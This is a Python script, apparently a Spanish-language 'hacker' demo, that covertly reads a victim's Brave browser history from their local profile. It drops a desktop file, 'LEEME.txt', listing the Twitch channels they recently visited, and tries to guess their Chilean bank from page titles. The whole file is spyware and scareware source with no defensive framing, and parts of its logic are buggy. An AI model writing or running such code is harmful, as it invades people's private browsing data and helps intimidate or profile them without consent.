import os
from time import sleep
from random import randrange
import sqlite3
from pathlib import Path
import re

HACKER_FILE_NAME = "LEEME.txt"


def get_user_path():
    user_path = "{}/".format(Path.home())
    return user_path


def wait_delay_action():
    n_horas = randrange(1, 4)
    sleep(n_horas)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "/OneDrive" + "/Escritorio/" + HACKER_FILE_NAME, "w")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:

            db_path = user_path + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History"
            con = sqlite3.connect(db_path)
            cursor = con.cursor()
            cursor.execute("select title, last_visit_time, url from urls order by last_visit_time desc")
            urls = cursor.fetchall()
            con.close()
            return urls
        except sqlite3.OperationalError:
            print("Database locked")
            sleep(3)


def check_twitch_profile(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]:
        results = re.findall("https://www.twitch.tv/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write(
        "He visto que has visitado últimamente los canales de twitch {}... \n".format(", ".join(profiles_visited)))


def get_bank_account(chrome_history):
    his_bank = None
    banks_lists = ["Banco Bice", "Banco Central de Chile", "Banco de Chile",
                   "Banco de Crédito e Inversiones", "Banco del Desarrollo",
                   "Banco Edwards","Banco Falabella", "Banco Internacional", "Banco Nova",
                   "Banco Penta", "Banco Santander", "Banco Security", "BancoEstado",
                   "BBVA", "CitibankN.A.Chile", "Corpbanca", "Credichile",
                   "DeutscheBank", "INGBankN.V.", "Redbanc",
                   "Scotiabank"]
    for item in chrome_history:
        for b in banks_lists:

            if item[0] in b:
                his_bank = b
                break

        if his_bank:
            break

    print(his_bank)


def main():
    wait_delay_action()
    user_path = get_user_path()
    hacker_file = create_hacker_file(user_path)
    chrome_history = get_chrome_history(user_path)
    check_twitch_profile(hacker_file, chrome_history)
    get_bank_account(chrome_history)


if __name__ == '__main__':
    main()
